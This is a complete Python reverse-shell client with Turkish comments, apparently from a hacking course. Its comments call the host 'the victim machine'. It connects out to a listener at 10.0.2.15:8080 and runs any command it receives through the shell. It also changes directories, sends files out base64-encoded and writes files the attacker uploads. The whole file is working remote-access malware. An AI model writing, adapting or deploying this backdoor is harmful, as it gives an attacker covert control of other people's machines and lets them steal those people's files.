#Bu program, bir sunucuya bağlanabilen bir istemci oluşturur ve sunucudan alınan komutları yerine getirir. 
import socket
import subprocess
import simplejson
import os
import base64

#kurban makıneyı temsil ediyor
class MySocket:
	def __init__(self, ip, port):
		self.my_connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		self.my_connection.connect((ip,port))

	def command_execution(self, command):
		return subprocess.check_output(command, shell=True) #check output komutu çalıştırdıgında sonucu döndürür.
	#bu fonksıyonun (check output ) amacı wındowsta komutu calistirip linuxa geri dondurmektir.
	#call ise sadece komutu çalıştırıyodu.
	#parametreyi liste değil string olarak verdik.


	def execute_cd_command(self,directory):
		os.chdir(directory) # işletim sistemi kütüphanesi ile directory değiştirme
		return "Cd to " + directory


	def json_send(self, data): #verilen veriyi JSON formatında sunucuya gönderir.
		json_data = simplejson.dumps(data)
		self.my_connection.send(json_data.encode("utf-8"))


	def json_receive(self): #sunucudan gelen veriyi alır ve JSON formatında döndürür.
		json_data = ""
		while True:
			try:
				json_data = json_data + self.my_connection.recv(1024).decode()
				return simplejson.loads(json_data) #paketleri json biçiminde gönderip - almak için
			except ValueError:
				continue


	def get_file_contents(self,path):
		with open(path,"rb") as my_file: #read binary ile dosyayı aç. jpg vs için de işe yarar
			return base64.b64encode(my_file.read())


	def save_file(self,path,content):
		with open(path,"wb") as my_file:
			my_file.write(base64.b64decode(content))
			return "Download OK"


	def start_socket(self): #start_socket metodu, sürekli olarak sunucudan gelen komutları alır ve işler.

		while True:
			command = self.json_receive()
			try:
				if command[0] == "quit":
					self.my_connection.close()
					exit()
				elif command[0] == "cd" and len(command) > 1: #cd nin yanında başka arguman var ise..
					command_output = self.execute_cd_command(command[1])
				elif command[0] == "download": #dosyadan icerigi alıyor.
					command_output = self.get_file_contents(command[1])
				elif command[0] == "upload": #dosyaya yazıyor
					command_output = self.save_file(command[1],command[2])
				else:
					command_output = self.command_execution(command)
			except Exception:
				command_output = "Error!"
			self.json_send(command_output)
		self.my_connection.close()
		

my_socket_object = MySocket("10.0.2.15",8080) #baglanılacak ıp ve port no
my_socket_object.start_socket()